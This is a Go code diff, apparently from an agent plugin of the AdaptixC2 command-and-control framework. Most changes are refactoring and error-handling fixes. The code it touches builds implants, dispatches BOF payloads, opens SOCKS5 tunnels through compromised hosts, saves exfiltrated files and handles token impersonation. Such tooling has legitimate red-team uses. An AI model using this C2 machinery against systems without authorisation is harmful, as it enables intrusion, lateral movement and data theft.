@@ -188,13 +188,13 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", err
 	}
 
-	cmdBuild := fmt.Sprintf("CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
+	cmdBuild := fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
 	if generateConfig.Os == "windows" && generateConfig.Win7support {
 		_, err := os.Stat("/usr/lib/go-win7/go")
 		if os.IsNotExist(err) {
 			return nil, "", errors.New("go-win7 not installed")
 		}
-		cmdBuild = fmt.Sprintf("CGO_ENABLED=0 GOOS=%s GOARCH=%s GOROOT=/usr/lib/go-win7/ /usr/lib/go-win7/go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
+		cmdBuild = fmt.Sprintf("GOWORK=off CGO_ENABLED=0 GOOS=%s GOARCH=%s GOROOT=/usr/lib/go-win7/ /usr/lib/go-win7/go build -trimpath -ldflags=\"%s\" -o %s", GoOs, GoArch, LdFlags, buildPath)
 	}
 	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
 	runnerCmdBuild.Dir = currentDir + "/" + SrcPath
@@ -215,7 +215,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	return buildContent, Filename, nil
 }
 
-func CreateAgent(initialData []byte) (adaptix.AgentData, error) {
+func CreateAgent(ts Teamserver, initialData []byte) (adaptix.AgentData, error) {
 	var agent adaptix.AgentData
 
 	/// START CODE HERE
@@ -450,8 +450,9 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 				err = errors.New("parameter 'bof' must be set")
 				goto RET
 			}
-			bofContent, err := base64.StdEncoding.DecodeString(bofFile)
-			if err != nil {
+			bofContent, decodeErr := base64.StdEncoding.DecodeString(bofFile)
+			if decodeErr != nil {
+				err = decodeErr
 				goto RET
 			}
 
@@ -622,24 +623,28 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 					goto RET
 				}
 
-				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
-				if err != nil {
+				tunnelId, err2 := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, true, username, password)
+				if err2 != nil {
+					err = err2
 					goto RET
 				}
-				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
-				if err != nil {
+				taskData.TaskId, err2 = ts.TsTunnelStart(tunnelId)
+				if err2 != nil {
+					err = err2
 					goto RET
 				}
 
 				taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)
 
 			} else {
-				tunnelId, err := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
-				if err != nil {
+				tunnelId, err2 := ts.TsTunnelCreateSocks5(agent.Id, "", address, port, false, "", "")
+				if err2 != nil {
+					err = err2
 					goto RET
 				}
-				taskData.TaskId, err = ts.TsTunnelStart(tunnelId)
-				if err != nil {
+				taskData.TaskId, err2 = ts.TsTunnelStart(tunnelId)
+				if err2 != nil {
+					err = err2
 					goto RET
 				}
 
@@ -674,13 +679,15 @@ func CreateTask(ts Teamserver, agent adaptix.AgentData, args map[string]any) (ad
 			goto RET
 		}
 
-		fileContent, err := base64.StdEncoding.DecodeString(localFile)
-		if err != nil {
+		fileContent, decodeErr := base64.StdEncoding.DecodeString(localFile)
+		if decodeErr != nil {
+			err = decodeErr
 			goto RET
 		}
 
-		zipContent, err := ZipBytes(fileContent, remote_path)
-		if err != nil {
+		zipContent, zipErr := ZipBytes(fileContent, remote_path)
+		if zipErr != nil {
+			err = zipErr
 			goto RET
 		}
 
@@ -849,16 +856,16 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 						if _, err := buf.Read(data); err != nil {
 							continue
 						}
-						name := ConvertCpToUTF8(string(filename), agentData.ACP)
+						name := ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
 						fileId := fmt.Sprintf("%08x", mrand.Uint32())
 						_ = ts.TsDownloadSave(agentData.Id, fileId, name, data)
 
 					} else if msg.Type == CALLBACK_ERROR {
 						task.MessageType = MESSAGE_ERROR
 						task.Message = "BOF error"
-						task.ClearText += ConvertCpToUTF8(string(msg.Data), agentData.ACP) + "\n"
+						task.ClearText += ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP) + "\n"
 					} else {
-						task.ClearText += ConvertCpToUTF8(string(msg.Data), agentData.ACP) + "\n"
+						task.ClearText += ts.TsConvertCpToUTF8(string(msg.Data), agentData.ACP) + "\n"
 					}
 				}
 
@@ -1366,14 +1373,17 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 				task.Message = "Command output:"
 				if agentData.Os == OS_WINDOWS {
-					task.ClearText = ConvertCpToUTF8(params.Output, agentData.OemCP)
+					task.ClearText = ts.TsConvertCpToUTF8(params.Output, agentData.OemCP)
 				} else {
 					task.ClearText = params.Output
 				}
 
 			case COMMAND_REV2SELF:
 				task.Message = "Token reverted successfully"
-				_ = ts.TsAgentSetImpersonate(agentData.Id, "", false)
+				emptyImpersonate := ""
+				_ = ts.TsAgentUpdateDataPartial(agentData.Id, struct {
+					Impersonated *string `json:"impersonated"`
+				}{Impersonated: &emptyImpersonate})
 
 			case COMMAND_RM:
 				task.Message = "Object deleted successfully"
@@ -1469,7 +1479,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 				}
 
 				if agentData.Os == OS_WINDOWS {
-					task.ClearText = ConvertCpToUTF8(params.Stdout, agentData.OemCP)
+					task.ClearText = ts.TsConvertCpToUTF8(params.Stdout, agentData.OemCP)
 				} else {
 					task.ClearText = params.Stdout
 				}
@@ -1477,7 +1487,7 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 				if params.Stderr != "" {
 					errorStr := params.Stderr
 					if agentData.Os == OS_WINDOWS {
-						errorStr = ConvertCpToUTF8(params.Stdout, agentData.OemCP)
+						errorStr = ts.TsConvertCpToUTF8(params.Stderr, agentData.OemCP)
 					}
 					task.ClearText += fmt.Sprintf("\n --- [error] --- \n%v ", errorStr)
 				}
@@ -1501,14 +1511,14 @@ func ProcessTasksResult(ts Teamserver, agentData adaptix.AgentData, taskData ada
 
 /// TUNNEL
 
-func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
+func TunnelCreateTCP(channelId int, tunnelType int, addressType int, address string, port int) ([]byte, error) {
 	addr := fmt.Sprintf("%s:%d", address, port)
 	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "tcp", ChannelId: channelId, Address: addr})
 	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
 	return msgpack.Marshal(cmd)
 }
 
-func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
+func TunnelCreateUDP(channelId int, tunnelType int, addressType int, address string, port int) ([]byte, error) {
 	addr := fmt.Sprintf("%s:%d", address, port)
 	packerData, _ := msgpack.Marshal(ParamsTunnelStart{Proto: "udp", ChannelId: channelId, Address: addr})
 	cmd := Command{Code: COMMAND_TUNNEL_START, Data: packerData}
@@ -1535,14 +1545,14 @@ func TunnelReverse(tunnelId int, port int) ([]byte, error) {
 
 /// TERMINAL
 
-func TerminalStart(terminalId int, program string, sizeH int, sizeW int) ([]byte, error) {
+func TerminalStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) ([]byte, error) {
 	packerData, _ := msgpack.Marshal(ParamsTerminalStart{TermId: terminalId, Program: program, Height: sizeH, Width: sizeW})
 	cmd := Command{Code: COMMAND_TERMINAL_START, Data: packerData}
 	return msgpack.Marshal(cmd)
 }
 
-func TerminalWrite(terminalId int, data []byte) ([]byte, error) {
-	return nil, nil
+func TerminalWrite(terminalId int, oemCP int, data []byte) ([]byte, error) {
+	return data, nil
 }
 
 func TerminalClose(terminalId int) ([]byte, error) {
